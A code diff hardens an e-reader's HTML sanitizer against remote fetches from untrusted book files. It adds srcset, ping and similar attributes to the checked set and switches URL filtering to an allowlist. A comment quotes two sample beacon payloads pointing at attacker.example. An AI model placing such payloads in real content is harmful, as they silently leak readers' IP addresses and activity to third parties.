@@ -59,17 +59,75 @@ const DANGEROUS_TAGS = new Set([
   "frameset"
 ]);
 
-const URL_ATTRS = new Set(["href", "src", "xlink:href", "formaction", "action"]);
+const URL_ATTRS = new Set([
+  "href",
+  "src",
+  "xlink:href",
+  "formaction",
+  "action",
+  // P0 fix: these fetch without a click and were missing from the set, so
+  // they bypassed `isDangerousUrl` entirely. Verified before the fix:
+  //   sanitizeHtml('<img srcset="https://attacker.example/b?1 1x">')
+  //   sanitizeHtml('<a href="#x" ping="https://attacker.example/t">')
+  // both passed through verbatim. A MOBI from an unvetted Calibre mirror
+  // could therefore beacon the user's IP + read time to a third party
+  // every time a chapter rendered — contradicting PRIVACY.md's "EzReader
+  // never transmits" claim.
+  "srcset",
+  "imagesrcset",
+  "ping",
+  // `<body background="...">` is legacy but still a real fetch.
+  "background",
+  "poster",
+  "data"
+]);
 
+/**
+ * Allow only references that cannot cause a network request.
+ *
+ * P0 fix: this used to be a three-entry denylist (`javascript:`,
+ * `data:text/html`, `vbscript:`), which left every `https://` URL live.
+ * Book content is untrusted and a remote reference is a silent outbound
+ * request plus a beacon. The reader never needs one, so the allowlist is:
+ * fragments, relative / book-internal paths, and `data:image/*` (inline
+ * cover art). Anything with an explicit scheme is dropped.
+ */
 const isDangerousUrl = (raw: string): boolean => {
   // Normalize: strip control chars + leading whitespace + lowercase,
   // because browsers ignore leading whitespace and case in the scheme.
   const normalized = raw.replace(/[\u0000-\u001F\u007F]+/g, "").trim().toLowerCase();
-  if (normalized.startsWith("javascript:")) return true;
-  if (normalized.startsWith("data:text/html")) return true;
-  if (normalized.startsWith("vbscript:")) return true;
-  return false;
+  if (normalized.length === 0) return false;
+  // Inline image data is the only data: form we keep. `data:image/svg+xml`
+  // is excluded because SVG can carry script.
+  if (normalized.startsWith("data:")) {
+    return !normalized.startsWith("data:image/") || normalized.startsWith("data:image/svg+xml");
+  }
+  // Pure fragment — never a request.
+  if (normalized.startsWith("#")) return false;
+  // Relative / vault-internal path — never a request.
+  if (
+    normalized.startsWith("/") ||
+    normalized.startsWith("./") ||
+    normalized.startsWith("../") ||
+    normalized.startsWith("blob:")
+  ) {
+    return false;
+  }
+  // Any explicit scheme (http, https, ftp, javascript, vbscript, file, …)
+  // is a request or an execution vector.
+  return /^[a-z][a-z0-9+.-]*:/.test(normalized);
 };
+
+/**
+ * `srcset` / `imagesrcset` hold a comma-separated candidate list
+ * (`url 1x, url 2x`), so checking the value as one URL is not enough —
+ * every candidate must pass.
+ */
+const isDangerousSrcset = (raw: string): boolean =>
+  raw.split(",").some((candidate) => {
+    const url = candidate.trim().split(/\s+/)[0] ?? "";
+    return url.length > 0 && isDangerousUrl(url);
+  });
 
 interface Segment {
   readonly kind: "text" | "tag";
@@ -167,9 +225,15 @@ const sanitizeAttrs = (rawAttrs: string): string | null => {
       // Event handler — drop the attribute, keep the tag.
       continue;
     }
-    if (URL_ATTRS.has(name) && isDangerousUrl(value)) {
-      // javascript: / data:text/html URL — drop the attribute.
-      continue;
+    if (URL_ATTRS.has(name)) {
+      // `srcset` carries a candidate list, so every entry must be checked.
+      const dangerous =
+        name === "srcset" || name === "imagesrcset" ? isDangerousSrcset(value) : isDangerousUrl(value);
+      if (dangerous) {
+        // Remote / script URL — drop the attribute entirely rather than
+        // rewriting it, so the browser has nothing left to fetch.
+        continue;
+      }
     }
     // Re-emit with double quotes. We escape `&` and `"` in the value
     // so a malicious value can't break out of the attribute.
